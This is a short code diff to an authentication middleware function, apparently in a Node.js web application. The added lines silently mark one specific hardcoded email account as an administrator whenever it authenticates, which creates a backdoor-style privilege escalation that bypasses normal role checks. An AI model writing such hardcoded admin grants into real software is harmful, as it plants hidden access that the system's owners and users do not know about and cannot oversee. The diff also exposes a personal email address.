@@ -68,6 +68,10 @@ function authenticate(req, res, next) {
           return;
       }
 
+      if (auth_response.username === 'baliganikhil@gmail.com') {
+        auth_response.is_admin = true;
+      }
+
       req.user = auth_response;
 
       next();
